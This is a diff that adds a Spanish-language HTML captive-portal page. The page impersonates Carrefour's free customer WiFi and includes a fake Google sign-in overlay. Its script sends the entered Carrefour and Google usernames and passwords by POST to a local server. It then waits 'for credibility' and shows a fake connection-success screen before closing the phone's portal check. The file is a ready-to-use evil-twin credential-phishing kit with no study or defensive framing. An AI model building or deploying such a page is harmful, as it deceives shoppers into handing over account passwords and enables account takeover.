@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WiFi Carrefour - Acceso Clientes</title>
+    <style>
+        :root {
+            --azul-cf: #004691;
+            --rojo-cf: #e02020;
+            --google-blue: #1a73e8;
+            --verde-ok: #34A853;
+            --text-dark: #202124;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f4f4f7;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .main-container {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        @media (min-width: 768px) {
+            .main-container { min-height: 650px; border-radius: 12px; height: auto; margin: 20px; }
+        }
+
+        .screen { display: none; padding: 30px; flex-direction: column; flex-grow: 1; animation: fadeIn 0.3s ease-out; }
+        .screen.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        .header-cf { padding: 20px; text-align: center; border-bottom: 5px solid var(--azul-cf); position: relative; }
+        .header-cf::after { content: ""; position: absolute; bottom: -10px; left: 0; width: 100%; height: 5px; background: var(--rojo-cf); }
+        .logo-cf { width: 50px; height: auto; }
+
+        .btn {
+            width: 100%; padding: 14px; border: none; border-radius: 6px;
+            font-weight: bold; font-size: 15px; cursor: pointer;
+            margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px;
+            transition: opacity 0.2s;
+        }
+        .btn:active { opacity: 0.8; }
+        .btn-red { background: var(--rojo-cf); color: white; text-transform: uppercase; }
+        .btn-blue { background: var(--azul-cf); color: white; }
+        .btn-google { background: white; color: #3c4043; border: 1px solid #dadce0; }
+
+        .field { margin-bottom: 15px; position: relative; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
+        input:focus { border-color: var(--azul-cf); outline: none; }
+        
+        .toggle-pass {
+            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; padding: 8px; cursor: pointer;
+        }
+        .toggle-pass svg { width: 20px; height: 20px; fill: #8e8e8e; }
+
+        .divider { margin: 25px 0; border-top: 1px solid #eee; position: relative; text-align: center; }
+        .divider span { position: absolute; top: -10px; background: white; padding: 0 10px; color: #999; font-size: 12px; left: 50%; transform: translateX(-50%); }
+
+        .login-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 100; display: none; flex-direction: column;
+            padding: 40px 30px; animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .login-overlay.active { display: flex; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        .back-btn { background: none; border: none; color: #555; font-size: 24px; cursor: pointer; margin-bottom: 20px; padding: 0; width: 30px; }
+        .google-logo { width: 75px; margin-bottom: 15px; }
+
+        .spinner {
+            border: 4px solid #f3f3f3; border-top: 4px solid var(--azul-cf);
+            border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <header id="cf-header" class="header-cf">
+        <svg class="logo-cf" viewBox="0 0 251.9 196.4">
+            <!-- Coordenadas corregidas según el error de image_80c361.png -->
+            <path fill="#004691" d="M177.4 98.2c0-28.1 11.4-53.4 29.9-71.6L191.6 10.8C165.4 31.8 149.2 63.9 149.2 98.2s16.2 66.4 42.4 87.4l15.7-15.8c-18.5-18.2-29.9-43.5-29.9-71.6zm37.4 63.9c-12.6-12.6-17.7-29.6-17.7-47.2s5.1-34.7 17.7-47.2l6.6 6.6c-11 10.7-14.3 26.1-14.3 40.6s2.9 30.5 14.3 40.6l-6.6 6.6z"/>
+            <path fill="#e02020" d="M74.5 98.2c0 28.1-11.4 53.4-29.9 71.6L60.3 185.6C86.6 164.6 102.7 132.5 102.7 98.2s-16.2-66.4-42.4-87.4L44.6 26.6c18.5 18.2 29.9 43.5 29.9 71.6zM37.1 34.3c12.6 12.6 17.7 29.6 17.7 47.2s-5.1 34.7-17.7-47.2l-6.6-6.6c11-10.7 14.3-26.1 14.3-40.6s-2.9-34.5-14.3-40.6l6.6 6.6z"/>
+        </svg>
+        <div style="color: var(--azul-cf); font-weight: bold; font-size: 1.2em;">Carrefour</div>
+    </header>
+
+    <!-- PANTALLA 1: BIENVENIDA -->
+    <section id="sc-welcome" class="screen active">
+        <h2 style="color: var(--azul-cf); margin: 0 0 10px 0;">Bienvenido al WiFi Gratis</h2>
+        <p style="color:#666; font-size:14px; line-height: 1.4;">Conéctate y disfruta de la mejor cobertura mientras realizas tus compras en nuestros centros.</p>
+        <button type="button" class="btn btn-red" onclick="navTo('sc-login')">Aceptar y Continuar</button>
+    </section>
+
+    <!-- PANTALLA 2: LOGIN CARREFOUR -->
+    <section id="sc-login" class="screen">
+        <form onsubmit="return handleForm(this)">
+            <div class="field">
+                <input type="text" name="user_cf" placeholder="Email o Tarjeta El Club" required>
+            </div>
+            <div class="field">
+                <input type="password" id="pass-cf" name="pass_cf" placeholder="Contraseña" style="padding-right: 45px;" required>
+                <button type="button" class="toggle-pass" onclick="togglePass('pass-cf')">
+                    <svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.74-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/></svg>
+                </button>
+            </div>
+            <button type="submit" class="btn btn-blue">Acceder</button>
+        </form>
+        <div class="divider"><span>O CONTINUAR CON</span></div>
+        <button type="button" class="btn btn-google" onclick="openSocial('google')">
+            <svg style="width:18px; height:18px;" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24s.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+            Google
+        </button>
+    </section>
+
+    <!-- MODAL GOOGLE -->
+    <div id="modal-google" class="login-overlay">
+        <button type="button" class="back-btn" onclick="closeSocial()">✕</button>
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo" alt="Google">
+        <h2 style="font-weight:400; margin: 0 0 8px 0;">Iniciar sesión</h2>
+        <p style="color:var(--text-dark); margin-bottom: 25px;">Usa tu cuenta de Google</p>
+        
+        <form onsubmit="return handleForm(this)">
+            <div class="field">
+                <input type="text" name="google_user" placeholder="Correo electrónico o teléfono" required>
+            </div>
+            <div class="field">
+                <input type="password" id="pass-google" name="google_pass" placeholder="Introduce tu contraseña" required>
+                <div style="margin-top: 10px; display: flex; align-items: center; gap: 8px; font-size: 14px;">
+                    <input type="checkbox" id="chk-g" onclick="togglePass('pass-google')" style="width: 16px; height: 16px;">
+                    <label for="chk-g">Mostrar contraseña</label>
+                </div>
+            </div>
+            <div style="text-align:right; margin-top:30px;">
+                <button type="submit" class="btn btn-blue" style="width:auto; padding:10px 24px;">Siguiente</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- CARGA -->
+    <section id="sc-loading" class="screen" style="text-align: center; justify-content: center;">
+        <div class="spinner"></div>
+        <h2 style="color: var(--azul-cf);">Conectando...</h2>
+        <p style="color: #666;">Validando credenciales en el sistema.</p>
+    </section>
+
+    <!-- ÉXITO -->
+    <section id="sc-success" class="screen" style="text-align: center; justify-content: center;">
+        <div style="font-size: 60px; color: var(--verde-ok); margin-bottom: 10px;">✔</div>
+        <h2 style="color: var(--azul-cf);">¡Conexión establecida!</h2>
+        <p style="color: #666;">Ya puedes navegar de forma gratuita e ilimitada.</p>
+        <button type="button" class="btn btn-blue" onclick="finishConnection()">SALIR</button>
+    </section>
+
+    <footer style="padding:20px; font-size:11px; color:#999; text-align:center; margin-top: auto;">
+        © 2026 Carrefour España | Seguridad y Privacidad
+    </footer>
+</div>
+
+<script>
+    function navTo(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    function openSocial(platform) {
+        document.getElementById('cf-header').style.visibility = 'hidden';
+        document.getElementById('modal-' + platform).classList.add('active');
+    }
+
+    function closeSocial() {
+        document.getElementById('cf-header').style.visibility = 'visible';
+        document.querySelectorAll('.login-overlay').forEach(m => m.classList.remove('active'));
+    }
+
+    function handleForm(form) {
+        const formData = new URLSearchParams(new FormData(form));
+        closeSocial();
+        navTo('sc-loading');
+
+        // Enviamos los datos al servidor Python
+        fetch('/', {
+            method: 'POST',
+            body: formData,
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+        })
+        .finally(() => {
+            // Simulamos una pequeña espera para credibilidad antes de mostrar ÉXITO
+            setTimeout(() => navTo('sc-success'), 2000);
+        });
+
+        return false; 
+    }
+
+    function finishConnection() {
+        // Redirección al test de Google para cerrar el Portal Cautivo del móvil
+        window.location.href = "http://connectivitycheck.gstatic.com/generate_204";
+    }
+
+    function togglePass(id) {
+        const input = document.getElementById(id);
+        input.type = (input.type === "password") ? "text" : "password";
+    }
+</script>
+</body>
+</html>
